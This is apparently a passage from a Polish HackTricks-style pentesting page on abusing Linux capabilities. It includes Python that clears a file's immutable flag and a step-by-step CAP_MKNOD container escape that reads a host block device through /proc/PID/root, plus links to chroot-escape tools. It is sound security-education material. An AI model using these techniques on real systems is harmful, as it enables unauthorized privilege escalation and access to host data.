**Ta capability umożliwia modyfikowanie flag inode, takich jak immutable i append-only.** Nie zapewnia bezpośrednio szerszych uprawnień do eskalacji uprawnień.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli znajdziesz plik oznaczony jako immutable, a python ma tę capability, możesz **usunąć atrybut immutable i sprawić, że plik będzie można modyfikować:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Operacje `FS_IOC_GETFLAGS` i `FS_IOC_SETFLAGS` odczytują i aktualizują flagi inode; `FS_IMMUTABLE_FL` to flaga immutable, która jest czyszczona w tym przykładzie.<sup>[[27]](#references)</sup>

> [!TIP]
> Zauważ, że zwykle ten atrybut immutable jest ustawiany i usuwany za pomocą:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `chroot(2)`, co potencjalnie pozwala na escape z environments `chroot(2)` za pomocą znanych vulnerabilities.<sup>[[11]](#references)[[14]](#references)</sup>

- [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: tool do chroot escape](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) umożliwia wykonanie wywołania systemowego `reboot(2)` w celu ponownego uruchomienia systemu, w tym poleceń takich jak `LINUX_REBOOT_CMD_RESTART2`; umożliwia również użycie `kexec_load(2)` oraz, od Linux 3.17, `kexec_file_load(2)` do ładowania odpowiednio nowych lub podpisanych crash kernels.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) została oddzielona od szerszej **CAP_SYS_ADMIN** w Linux 2.6.37, zapewniając konkretnie możliwość używania wywołania `syslog(2)`. Capability ta umożliwia przeglądanie adresów kernela za pośrednictwem `/proc` i podobnych interfejsów, gdy ustawienie `kptr_restrict` ma wartość 1, co kontroluje ujawnianie adresów kernela. Od Linux 2.6.39 wartością domyślną `kptr_restrict` jest 0, co oznacza, że adresy kernela są ujawniane, jednak wiele dystrybucji ustawia tę wartość na 1 (ukrywanie adresów z wyjątkiem uid 0) lub 2 (zawsze ukrywaj adresy) ze względów bezpieczeństwa.<sup>[[14]](#references)</sup>

Ponadto **CAP_SYSLOG** umożliwia dostęp do outputu `dmesg`, gdy `dmesg_restrict` ma wartość 1. Pomimo tych zmian **CAP_SYS_ADMIN** zachowuje możliwość wykonywania operacji `syslog` ze względu na historyczne uwarunkowania.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) rozszerza funkcjonalność wywołania systemowego `mknod` poza tworzenie zwykłych plików, FIFO (named pipes) lub UNIX domain sockets. Umożliwia konkretnie tworzenie special files, do których należą:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Character special files, czyli urządzenia takie jak terminale.
- **S_IFBLK**: Block special files, czyli urządzenia takie jak dyski.

Capability ta jest przydatna dla procesów, które muszą tworzyć device files, w tym character lub block devices.<sup>[[14]](#references)</sup>

Jest uwzględniona w udokumentowanym domyślnym zestawie capabilities Dockera; należy zweryfikować rzeczywistą konfigurację runtime zamiast zakładać, że każde wdrożenie używa tych samych wartości domyślnych ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Capability ta umożliwia privilege escalations (przez pełny odczyt dysku) na hoście w następujących warunkach:<sup>[[7]](#references)</sup>

1. Mieć początkowy dostęp do hosta (Unprivileged).
2. Mieć początkowy dostęp do containera (Privileged (EUID 0) oraz effective `CAP_MKNOD`).
3. Host i container powinny współdzielić tę samą user namespace.

**Kroki tworzenia i uzyskiwania dostępu do urządzenia blokowego w containerze:**

1. **Na hoście jako standardowy użytkownik:**

- Ustal swój bieżący user ID za pomocą `id`, np. `uid=1000(standarduser)`.
- Zidentyfikuj urządzenie docelowe, na przykład `/dev/sdb`.

2. **Wewnątrz containera jako `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Z powrotem na hoście:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
To podejście pozwala standardowemu użytkownikowi uzyskać dostęp i potencjalnie odczytywać dane z `/dev/sdb` za pośrednictwem kontenera, gdy urządzenie, namespaces i permissions są skonfigurowane w opisany sposób.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

We współczesnych kernelach Linux obsługujących file capabilities, **`CAP_SETPCAP`** pozwala wątkowi dodawać capabilities z jego bounding set do inheritable set, usuwać capabilities z jego bounding set oraz zmieniać jego securebits. Nie pozwala procesowi dowolnie przyznawać capabilities innemu procesowi; takie zachowanie dotyczy wyłącznie kerneli starszych niż 2.6.25, które nie obsługiwały file capabilities.<sup>[[14]](#references)</sup>

Wywołanie systemowe `capset()` może modyfikować własne effective, permitted i inheritable sets wątku, ale nowy permitted set nie może zawierać capabilities spoza istniejącego permitted set, a aktualizacje inheritable set nadal podlegają ograniczeniom kernela.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - laboratoria privilege escalation dotyczące Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Privilege Escalation w Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Podstawy Linux Container: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Wykorzystanie Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Nadmierne Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Nadużywanie dostępu do mount namespaces przez /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: dlaczego istnieją i jak działają](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Zrozumienie Capabilities w Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC omijania seccomp, jeśli ptrace jest dozwolone](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Jak wydostać się z różnych rozwiązań chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - oryginalny exploit Docker breakout wykorzystujący CAP_DAC_READ_SEARCH autorstwa Sebastiana Krahmera](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analiza exploita Docker breakout](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - strona podręcznika Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - strona podręcznika Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - strona podręcznika Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - strona podręcznika Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Uruchamianie kontenerów - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - strona podręcznika Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - strona podręcznika Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - strona podręcznika Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
